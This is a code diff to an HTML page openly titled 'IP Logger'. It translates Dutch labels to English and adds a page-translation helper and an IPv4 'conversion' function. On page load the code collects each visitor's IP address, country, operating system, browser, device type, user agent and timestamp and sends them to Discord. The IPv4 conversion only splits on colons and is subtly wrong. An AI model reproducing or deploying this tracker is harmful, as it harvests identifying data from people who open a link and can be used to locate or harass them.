@@ -51,6 +51,7 @@
                         .then(response => response.json())
                         .then(locationData => {
                             sendEmbed(ipAddress, locationData);
+                            translatePage(locationData.country_code);
                         })
                         .catch(error => {
                             console.error('Unable to fetch location data:', error);
@@ -69,28 +70,29 @@
             var os = detectOS(userAgent);
             var browser = detectBrowser(userAgent);
             var deviceType = getDeviceType();
+            var ipv4Address = convertToIPv4(ipAddress);
 
-            var country = (locationData && locationData.country_name) ? locationData.country_name : "Onbekend";
+            var country = (locationData && locationData.country_name) ? locationData.country_name : "Unknown";
 
             var embed = {
                 "embeds": [
                     {
                         "title": "IP Logger",
-                        "description": "Een gebruiker heeft de pagina bezocht.",
-                        "color": 65280, // Groen als het leuk vond, Rood als niet leuk
+                        "description": "A user has visited the page.",
+                        "color": 65280, // Green if liked, Red if not
                         "fields": [
                             {
-                                "name": "IP Adres",
-                                "value": ipAddress,
+                                "name": "IP Address",
+                                "value": ipv4Address,
                                 "inline": true
                             },
                             {
-                                "name": "Land",
+                                "name": "Country",
                                 "value": country,
                                 "inline": true
                             },
                             {
-                                "name": "Besturingssysteem",
+                                "name": "Operating System",
                                 "value": os,
                                 "inline": true
                             },
@@ -100,17 +102,17 @@
                                 "inline": true
                             },
                             {
-                                "name": "Apparaat Type",
+                                "name": "Device Type",
                                 "value": deviceType,
                                 "inline": true
                             },
                             {
-                                "name": "Gebruikersagent",
+                                "name": "User Agent",
                                 "value": userAgent,
                                 "inline": false
                             },
                             {
-                                "name": "Tijdstip",
+                                "name": "Timestamp",
                                 "value": timestamp,
                                 "inline": true
                             }
@@ -138,7 +140,7 @@
                 return userAgent.indexOf(os) >= 0;
             });
 
-            return detectedOS || 'Onbekend';
+            return detectedOS || 'Unknown';
         }
 
         function detectBrowser(userAgent) {
@@ -154,7 +156,7 @@
                 return userAgent.indexOf(browser) >= 0;
             });
 
-            return detectedBrowser || 'Onbekend';
+            return detectedBrowser || 'Unknown';
         }
 
         function getDeviceType() {
@@ -166,14 +168,31 @@
             return "Unknown Device";
         }
 
+        function convertToIPv4(ipAddress) {
+            var ipv4 = ipAddress.split(":").pop();
+            return ipv4;
+        }
+
+        function translatePage(countryCode) {
+            var lang = countryCode.toLowerCase(); // You may need to map the country code to a language code
+            var langElements = document.querySelectorAll("[data-lang]");
+            langElements.forEach(element => {
+                var translations = element.dataset.lang.split(";");
+                var translatedText = translations.find(translation => translation.startsWith(lang + ":"));
+                if (translatedText) {
+                    element.innerHTML = translatedText.split(":")[1];
+                }
+            });
+        }
+
         window.onload = function() {
-            startMusic(); // Start muziek direct bij het laden van de pagina
+            startMusic(); // Start music immediately when the page loads
             sendToDiscord();
         }
     </script>
 </head>
 <body>
-    <h1>Welkom bij onze geweldige site!</h1>
-    <p>Geniet van de muziek terwijl we uw IP-adres loggen.</p>
+    <h1 data-lang="nl:Welkom bij onze geweldige site!;en:Welcome to our awesome site!">Welkom bij onze geweldige site!</h1>
+    <p data-lang="nl:Geniet van de muziek terwijl we uw IP-adres loggen.;en:Enjoy the music while we log your IP address.">Geniet van de muziek terwijl we uw IP-adres loggen.</p>
 </body>
 </html>
